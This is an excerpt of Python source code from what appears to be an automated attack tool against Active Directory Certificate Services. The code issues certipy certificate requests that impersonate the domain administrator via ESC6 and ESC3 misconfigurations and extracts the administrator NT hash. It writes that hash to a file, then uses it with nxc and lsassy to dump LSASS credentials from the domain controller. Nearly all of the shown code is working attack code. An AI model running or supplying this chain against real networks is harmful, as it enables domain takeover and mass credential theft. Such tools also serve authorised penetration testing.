    ...
    def try_exploit_esc(esc_number, ca_name=None, template_name=None):
        if esc_number == "ESC6":
            commands = [
                "certipy req -u '{username}@{domain}' -p '{password}' -target-ip {dc_ip} -ca '{ca_name}' -upn administrator@{domain} -web -debug",
                "certipy req -u '{username}@{domain}' -p '{password}' -target-ip {dc_ip} -ca '{ca_name}' -upn administrator@{domain} -debug"
            ]
        elif esc_number == "ESC3":
            commands = [
                "certipy req -u '{username}@{domain}' -p '{password}' -target-ip {dc_ip} -ca '{ca_name}' -template '{template_name}' -debug -out agent_cert.pfx",
                "certipy req -u '{username}@{domain}' -p '{password}' -target-ip {dc_ip} -ca '{ca_name}' -template User -on-behalf-of 'administrator@{domain}' -pfx agent_cert.pfx -debug"
            ]
            ...
            commands = ["certipy req -u '{username}@{domain}' -p '{password}' -target-ip {dc_ip} -ca '{ca_name}' -template '{template_name}' -upn administrator@{domain} -debug"]
        else:
        ...
        def execute_command(cmd, max_attempts=2):
            for attempt in range(max_attempts):
                try:
                    result = subprocess.run(cmd.format(**params), shell=True, capture_output=True, text=True, timeout=30)
                    if "Successfully requested certificate" in result.stdout:
                        return True, result
                    elif "NETBIOS connection with the remote host timed out" in result.stderr:
                        if attempt < max_attempts - 1:
                            print(colored(f"⚠️ Timeout detected, retrying... (attempt {attempt + 2}/{max_attempts})", "yellow"))
                            continue
                        else:
                            print(colored("❌ Exploit failed: Multiple timeouts detected", "red"))
                            return False, result
                    elif "Failed to connect to Web Enrollment interface" in result.stderr and esc_number == "ESC6":
                        if attempt < max_attempts - 1:
                            print(colored("⚠️ Web Enrollment failed, trying alternative method...", "yellow"))
                            continue
                        else:
                            print(colored("❌ Exploit failed: Web Enrollment and alternative method failed", "red"))
                            return False, result
                    elif "_http_request() got an unexpected keyword argument 'chunked'" in result.stderr and esc_number == "ESC6":
                        if attempt < max_attempts - 1:
                            print(colored("⚠️ HTTP request error, trying alternative method...", "yellow"))
                            continue
                        else:
                            print(colored("❌ Exploit failed: HTTP request error and alternative method failed", "red"))
                            return False, result
                    elif "Connection reset by peer" in result.stderr and esc_number == "ESC6":
                        if attempt < max_attempts - 1:
                            print(colored("⚠️ Connection reset, trying alternative method...", "yellow"))
                            continue
                        else:
                            print(colored("❌ Exploit failed: Connection reset and alternative method failed", "red"))
                            return False, result
                    else:
                        return False, result
                except subprocess.TimeoutExpired:
                    if attempt < max_attempts - 1:
                        print(colored(f"⚠️ Command timed out, retrying... (attempt {attempt + 2}/{max_attempts})", "yellow"))
                        continue
                    else:
                        print(colored("❌ Exploit failed: Command timed out multiple times", "red"))
                        return False, None
            return False, None
            ...
            if isinstance(commands, list):
                for cmd in commands:
                    ...
                    if "Successfully requested certificate" in result.stdout:
                        ...
                        pfx_match = re.search(r"Saved certificate and private key to '([^']+)'", result.stdout)
                        if pfx_match:
                            pfx_file = pfx_match.group(1)
                            if not os.path.exists(pfx_file):
                                print(colored(f"❌ Generated file not found: {pfx_file}", "red"))
                                return False
                            
                            # Exécuter certipy auth et extraire le hash NT
                            auth_command = f"certipy auth -pfx {pfx_file} -domain {params['domain']}"
                            auth_result = subprocess.run(auth_command, shell=True, capture_output=True, text=True)
                            
                            hash_match = re.search(r"Got hash for 'administrator@.*': [^:]+:([a-f0-9]+)", auth_result.stdout)
                            if hash_match:
                                nt_hash = hash_match.group(1)
                                print(colored(f"\n🔑 Administrator hash: administrator:{nt_hash}", "green", attrs=["bold"]))
                                
                                with open("cracked_credentials.txt", "a") as f:
                                    f.write(f"administrator:{nt_hash}\n")
                                
                                print(colored("\n🎯 Attempting to dump LSASS with NT hash...", "cyan"))
                                lsassy_command = f"nxc smb {params['dc_ip']} -u Administrator -H {nt_hash} -M lsassy"
                                lsassy_result = subprocess.run(lsassy_command, shell=True, capture_output=True, text=True)
                                
                                if lsassy_result.stdout:
                                    print(colored("\nLSASSY Results:", "yellow"))
                                    print(lsassy_result.stdout)
                                    
                                    admin_results = {"lsassy": [], "dpapi": []}
                                    for line in lsassy_result.stdout.splitlines():
                                        if "LSASSY" in line and not any(x in line for x in ["[*]", "[+]"]):
                                            admin_results["lsassy"].append(line.strip())
                                    
                                    if admin_results["lsassy"]:
                                        with open("admin_results.txt", "a") as f:
                                            f.write(f"\n=== LSASSY Results from ESC{esc_number} ===\n")
                                            for cred in admin_results["lsassy"]:
                                                f.write(f"{cred}\n")
                            else:
                                print(colored("❌ Failed to retrieve NT hash", "red"))
                                return False
                    elif result.returncode != 0:
                        print(colored("❌ Step failed!", "red"))
                        return False
            else:
                success, result = execute_command(commands[0])
                if not success:
                    if result:
                        print(colored("\nOutput:", "yellow"))
                        print(result.stdout)
                ...
                if "Successfully requested certificate" in result.stdout:
                    ...
                    pfx_file = None
                    if "Saved certificate and private key to" in result.stdout:
                        pfx_match = re.search(r"Saved certificate and private key to '([^']+)'", result.stdout)
                        if pfx_match:
                            pfx_file = pfx_match.group(1)
